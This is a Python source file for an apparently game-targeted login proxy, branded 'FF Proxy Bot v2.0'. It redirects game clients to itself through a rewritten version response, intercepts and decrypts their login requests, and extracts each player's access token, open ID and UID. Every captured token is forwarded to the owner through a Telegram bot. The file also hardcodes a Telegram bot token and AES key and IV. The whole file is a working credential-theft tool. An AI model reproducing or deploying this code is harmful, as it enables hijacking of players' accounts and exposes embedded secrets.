import httpx
import uvicorn
import json
import os
import logging
import time
import threading
from fastapi import FastAPI, Request
from fastapi.responses import Response as FastAPIResponse, JSONResponse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from x7m import *
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ══════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

# AES Keys
Key = b'Yg&tc%DEuh6%Zc^8'
Iv = b'6oyZDr22E3ychjM%'

# Telegram Bot
BOT_TOKEN = "8627834434:AAEv5FA25Pd7DHkzISDX1fOcP4RHSrGIHik"
OWNER_IDS = [8078228501]
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# Token Storage
TOKEN_DB = []

# ══════════════════════════════════════════════════════
# TELEGRAM BOT HANDLERS
# ══════════════════════════════════════════════════════
def is_owner(user_id):
    return user_id in OWNER_IDS

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if not is_owner(message.chat.id):
        bot.reply_to(message, "❌ Access Denied!")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📊 View Tokens", callback_data="view_tokens"),
        InlineKeyboardButton("🗑 Clear Tokens", callback_data="clear_tokens")
    )
    markup.add(
        InlineKeyboardButton("📈 Stats", callback_data="stats"),
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
    )
    
    bot.send_message(
        message.chat.id,
        """
🔐 *FF Proxy Bot v2.0*

Welcome Owner! 👑

▸ Bot Status: ✅ Online
▸ Proxy: Active
▸ Tokens Captured: *{}*

━━━━━━━━━━━━━━━
@BBYTOP3 | FF Proxy
        """.format(len(TOKEN_DB)),
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if not is_owner(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Access Denied!", show_alert=True)
        return
    
    if call.data == "view_tokens":
        if not TOKEN_DB:
            bot.send_message(call.message.chat.id, "📭 No tokens captured yet!")
        else:
            # Send last 5 tokens
            for token_data in TOKEN_DB[-5:]:
                text = f"""
🔑 *Token #{token_data.get('id', 'N/A')}*

▸ Access Token:
`{token_data['token'][:50]}...`

▸ Open ID:
`{token_data['open_id'][:50]}...`

▸ UID: `{token_data.get('uid', 'N/A')}`
▸ Time: {token_data['time']}
"""
                bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        
        bot.answer_callback_query(call.id, "✅ Tokens sent!")
    
    elif call.data == "clear_tokens":
        count = len(TOKEN_DB)
        TOKEN_DB.clear()
        bot.send_message(call.message.chat.id, f"✅ Cleared {count} tokens!")
        bot.answer_callback_query(call.id, "🗑 Tokens cleared!")
    
    elif call.data == "stats":
        text = f"""
📊 *Proxy Stats*

▸ Total Tokens: *{len(TOKEN_DB)}*
▸ Uptime: Active
▸ Server: Cloud Render
▸ Version: v2.0

━━━━━━━━━━━━━━━
@BBYTOP3
"""
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "📊 Stats loaded!")
    
    elif call.data == "refresh":
        bot.edit_message_text(
            f"🔐 *FF Proxy Bot v2.0*\n\n✅ Online | Tokens: *{len(TOKEN_DB)}*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=call.message.reply_markup
        )
        bot.answer_callback_query(call.id, "🔄 Refreshed!")

# ══════════════════════════════════════════════════════
# SEND TOKEN TO OWNER
# ══════════════════════════════════════════════════════
def send_token_to_owner(access_token, open_id, uid):
    """Send token to owner via Telegram bot"""
    text = f"""
🔑 *New Token Captured!*

▸ Access Token:
`{access_token}`

▸ Open ID:
`{open_id}`

▸ UID: `{uid}`
▸ Time: {time.strftime("%Y-%m-%d %H:%M:%S")}

━━━━━━━━━━━━━━━
@BBYTOP3 | FF Proxy v2.0
"""
    
    for owner_id in OWNER_IDS:
        try:
            bot.send_message(owner_id, text, parse_mode="Markdown")
            logger.info(f"✅ Token sent to owner {owner_id}")
        except Exception as e:
            logger.error(f"❌ Failed to send to {owner_id}: {e}")

# ══════════════════════════════════════════════════════
# AES HELPERS
# ══════════════════════════════════════════════════════
def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()

def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

# ══════════════════════════════════════════════════════
# VERSION PROXY
# ══════════════════════════════════════════════════════
@app.api_route("/ver.php", methods=["GET", "POST"])
async def version_proxy(request: Request):
    target = "https://version.ggwhitehawk.com/live/ver.php"
    headers = {
        k: v for k, v in request.headers.items()
        if k.lower() not in ("host", "content-length", "connection")
    }

    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=15.0) as client:
            r = await client.request(
                request.method,
                target,
                params=dict(request.query_params),
                headers=headers,
                content=await request.body()
            )

        data = r.json()
        host = request.headers.get("host", "192.168.1.11:6677")
        scheme = "https" if "onrender.com" in host else "http"
        data["server_url"] = f"{scheme}://{host}/"

        HOP_BY_HOP = {
            'transfer-encoding', 'connection', 'keep-alive',
            'proxy-authenticate', 'proxy-authorization',
            'te', 'trailers', 'upgrade', 'proxy-connection'
        }
        response_headers = {
            k: v for k, v in r.headers.items()
            if k.lower() not in HOP_BY_HOP
            and k.lower() not in ("content-length", "content-encoding")
        }

        return JSONResponse(
            content=data,
            status_code=r.status_code,
            headers=response_headers
        )

    except Exception as e:
        logger.error(f"Version proxy error: {e}")
        return JSONResponse(content={"error": "Proxy failed"}, status_code=502)

# ══════════════════════════════════════════════════════
# LOGIN INTERCEPTOR
# ══════════════════════════════════════════════════════
@app.api_route("/MajorLogin", methods=["POST"])
async def login_interceptor(request: Request):
    try:
        PyL = await request.body()
        logger.info(f"📱 Login request | Size: {len(PyL)} bytes")

        decrypted = decrypt_api(PyL.hex())
        x7m = json.loads(get_available_room(decrypted))

        acess_token = x7m.get("29", "N/A")
        open_id = x7m.get("22", "N/A")
        uid = x7m.get("uid", x7m.get("player_id", "N/A"))

        # Store
        token_entry = {
            "id": len(TOKEN_DB) + 1,
            "token": acess_token,
            "open_id": open_id,
            "uid": uid,
            "time": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        TOKEN_DB.append(token_entry)

        # Send via bot
        threading.Thread(
            target=send_token_to_owner,
            args=(acess_token, open_id, uid),
            daemon=True
        ).start()

        logger.info(f"✅ Token #{token_entry['id']} captured!")

        response_text = f""" [b][c][279CF5]


███████████╗░██████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔══██╗██╔══██╗
██████╦╝██████╦╝░╚████╔╝░░░░██║░░░██║░░██║██████╔╝
██╔══██╗██╔══██╗░░╚██╔╝░░░░░██║░░░██║░░██║██╔═══╝░
██████╦╝██████╦╝░░░██║░░░░░░██║░░░╚█████╔╝██║░░░░░
╚═════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░░╚════╝░╚═╝░░░░░


─────────────────────────────────────

[cccccc]Access Token => [ff0000]{acess_token} [cccccc]| Open ID => [00ff00]{open_id}

[00ff00]Telegram => @BBYTOP3

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    """

        return FastAPIResponse(
            content=response_text,
            status_code=500,
            media_type="application/octet-stream"
        )

    except Exception as e:
        logger.error(f"❌ Login failed: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)

# ══════════════════════════════════════════════════════
# HEALTH CHECK
# ══════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "status": "alive",
        "tokens": len(TOKEN_DB),
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }

# ══════════════════════════════════════════════════════
# STARTUP
# ══════════════════════════════════════════════════════
def run_bot():
    """Run Telegram bot in background"""
    while True:
        try:
            logger.info("🤖 Bot polling started...")
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Start bot thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Start FastAPI
    port = int(os.environ.get('PORT', 6677))
    logger.info(f"🚀 FF Proxy starting on port {port}")
    uvicorn.run(app, host='0.0.0.0', port=port, log_level='info')